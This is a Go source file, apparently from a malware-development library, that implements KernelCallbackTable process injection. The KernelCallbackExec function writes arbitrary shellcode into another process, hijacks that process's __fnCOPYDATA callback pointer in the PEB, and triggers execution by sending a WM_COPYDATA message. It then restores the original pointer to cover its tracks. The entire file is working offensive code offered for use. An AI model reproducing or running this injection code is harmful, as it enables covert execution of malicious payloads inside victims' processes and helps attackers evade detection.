//go:build windows

package inject

import (
	"fmt"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	"golang.org/x/sys/windows"
)

// KernelCallbackTable offsets and constants for x64.
const (
	// Offset of KernelCallbackTable in PEB (x64).
	pebKernelCallbackTableOffset = 0x58

	// __fnCOPYDATA is index 3 in the KernelCallbackTable.
	fnCOPYDATAIndex = 3

	// WM_COPYDATA message constant.
	wmCOPYDATA = 0x004A
)

// processBasicInfo is the PROCESS_BASIC_INFORMATION structure returned by
// NtQueryInformationProcess(ProcessBasicInformation).
type processBasicInfo struct {
	ExitStatus                   uintptr
	PebBaseAddress               uintptr
	AffinityMask                 uintptr
	BasePriority                 int32
	_                            [4]byte // padding on x64
	UniqueProcessID              uintptr
	InheritedFromUniqueProcessID uintptr
}

// copyDataStruct is the COPYDATASTRUCT for WM_COPYDATA.
type copyDataStruct struct {
	DwData uintptr
	CbData uint32
	_      [4]byte // padding on x64
	LpData uintptr
}

// KernelCallbackExec executes shellcode in a remote process by hijacking
// the __fnCOPYDATA callback in the PEB's KernelCallbackTable.
// After execution, the original callback pointer is restored.
func KernelCallbackExec(pid int, shellcode []byte) error {
	if pid <= 0 {
		return fmt.Errorf("valid target process required")
	}
	if err := validateShellcode(shellcode); err != nil {
		return err
	}

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION,
		false,
		uint32(pid),
	)
	if err != nil {
		return fmt.Errorf("failed to open target process: %w", err)
	}
	defer windows.CloseHandle(hProcess)

	// 1. Get PEB address via NtQueryInformationProcess(ProcessBasicInformation = 0).
	var pbi processBasicInfo
	var retLen uint32
	status, _, _ := api.ProcNtQueryInformationProcess.Call(
		uintptr(hProcess),
		0, // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		uintptr(unsafe.Pointer(&retLen)),
	)
	if status != 0 {
		return fmt.Errorf("failed to query process information: NTSTATUS 0x%X", status)
	}

	// 2. Read KernelCallbackTable pointer from PEB+0x58.
	var kernelCallbackTable uintptr
	if err := windows.ReadProcessMemory(
		hProcess,
		pbi.PebBaseAddress+pebKernelCallbackTableOffset,
		(*byte)(unsafe.Pointer(&kernelCallbackTable)),
		unsafe.Sizeof(kernelCallbackTable),
		nil,
	); err != nil {
		return fmt.Errorf("failed to read callback table pointer: %w", err)
	}

	// 3. Read original __fnCOPYDATA entry (index 3).
	fnCOPYDATAAddr := kernelCallbackTable + uintptr(fnCOPYDATAIndex)*unsafe.Sizeof(uintptr(0))
	var originalCallback uintptr
	if err := windows.ReadProcessMemory(
		hProcess,
		fnCOPYDATAAddr,
		(*byte)(unsafe.Pointer(&originalCallback)),
		unsafe.Sizeof(originalCallback),
		nil,
	); err != nil {
		return fmt.Errorf("failed to read original callback: %w", err)
	}

	// 4. Allocate RX memory in target, write shellcode.
	remoteBuf, _, allocErr := api.ProcVirtualAllocEx.Call(
		uintptr(hProcess), 0, uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if remoteBuf == 0 {
		return fmt.Errorf("remote memory allocation failed: %w", allocErr)
	}

	if err := windows.WriteProcessMemory(
		hProcess, remoteBuf, &shellcode[0], uintptr(len(shellcode)), nil,
	); err != nil {
		return fmt.Errorf("remote memory write failed: %w", err)
	}

	var oldProtect uint32
	if err := windows.VirtualProtectEx(
		hProcess, remoteBuf, uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ, &oldProtect,
	); err != nil {
		return fmt.Errorf("remote memory protection change failed: %w", err)
	}

	// 5. Overwrite __fnCOPYDATA with shellcode address.
	if err := overwriteCallbackEntry(hProcess, fnCOPYDATAAddr, remoteBuf); err != nil {
		return err
	}

	// 6. Find a window in the target process and send WM_COPYDATA to trigger callback.
	hwnd := findWindowByPID(uint32(pid))
	if hwnd == 0 {
		// Restore before returning error.
		_ = overwriteCallbackEntry(hProcess, fnCOPYDATAAddr, originalCallback)
		return fmt.Errorf("no suitable window found in target process")
	}

	var cds copyDataStruct
	cds.DwData = 0
	cds.CbData = 1
	cds.LpData = 0
	api.ProcSendMessageW.Call(
		uintptr(hwnd),
		wmCOPYDATA,
		0,
		uintptr(unsafe.Pointer(&cds)),
	)

	// 7. Restore original __fnCOPYDATA pointer.
	_ = overwriteCallbackEntry(hProcess, fnCOPYDATAAddr, originalCallback)

	return nil
}

// overwriteCallbackEntry writes a pointer value at the given remote address.
func overwriteCallbackEntry(hProcess windows.Handle, addr, value uintptr) error {
	var oldProtect uint32
	if err := windows.VirtualProtectEx(
		hProcess, addr, unsafe.Sizeof(value),
		windows.PAGE_READWRITE, &oldProtect,
	); err != nil {
		return fmt.Errorf("callback table protection change failed: %w", err)
	}

	if err := windows.WriteProcessMemory(
		hProcess, addr, (*byte)(unsafe.Pointer(&value)), unsafe.Sizeof(value), nil,
	); err != nil {
		return fmt.Errorf("callback table write failed: %w", err)
	}

	if err := windows.VirtualProtectEx(
		hProcess, addr, unsafe.Sizeof(value),
		oldProtect, &oldProtect,
	); err != nil {
		return fmt.Errorf("callback table protection restore failed: %w", err)
	}

	return nil
}

// findWindowByPID enumerates top-level windows and returns the first one
// belonging to the given process ID.
func findWindowByPID(pid uint32) windows.HWND {
	type enumResult struct {
		pid  uint32
		hwnd windows.HWND
	}
	result := &enumResult{pid: pid}

	// EnumWindows calls the callback for each top-level window.
	api.ProcEnumWindows.Call(
		windows.NewCallback(func(hwnd windows.HWND, lParam uintptr) uintptr {
			r := (*enumResult)(unsafe.Pointer(lParam))
			var windowPID uint32
			windows.GetWindowThreadProcessId(hwnd, &windowPID)
			if windowPID == r.pid {
				r.hwnd = hwnd
				return 0 // stop enumeration
			}
			return 1 // continue
		}),
		uintptr(unsafe.Pointer(result)),
	)

	return result.hwnd
}
